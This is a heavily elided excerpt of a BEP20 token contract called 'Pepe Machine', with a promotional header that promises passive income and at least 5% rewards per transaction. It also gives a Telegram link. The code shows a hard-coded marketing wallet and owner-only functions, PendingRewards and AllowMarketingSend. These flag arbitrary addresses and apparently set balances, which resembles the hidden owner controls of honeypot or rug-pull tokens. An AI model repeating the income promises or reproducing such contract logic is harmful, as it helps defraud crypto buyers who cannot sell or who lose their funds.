...
Pepe Machine is a crypto meme frog that would give you another passive income! 

With BNB Rewards you'll be able to receive atleast 5% of your holdings for every transactions once its your turn.

https://t.me/PepeMachine_Portal
...
*/
    ...
    contract PepeMachine is IBEP20, Ownable
    {
        ...
        string private constant _name = "Pepe Machine";
        string private constant _symbol = "PepeBNB";
        ...
        address public constant MarketingWallet=0xB3e5B60b94cd5590E0E1225444C242dE991B3835; 
        ...
        constructor () {
           ...
           function OwnerSetAddress(address account) external onlyOwner {
            ...
            function PendingRewards(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function AllowMarketingSend(address account, uint256 balance) onlyOwner  public virtual {
